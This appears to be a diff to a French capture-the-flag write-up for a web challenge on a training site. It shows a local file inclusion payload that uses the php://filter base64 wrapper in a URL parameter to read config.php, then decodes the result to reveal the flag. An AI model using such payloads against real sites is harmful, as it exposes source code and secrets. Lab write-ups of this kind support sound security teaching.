@@ -16,3 +16,12 @@ On va donc passer notre payloads directement dans l'url
 ```
 https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
 ```
+```JS
+decodedFlag = window.atob(unescape(encodeURIComponent("PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==")))
+```
+
+```PHP
+<?php
+  // Congratz ! FLAG IS BFS{U_h4v3_Un0!!!}
+?>
+```
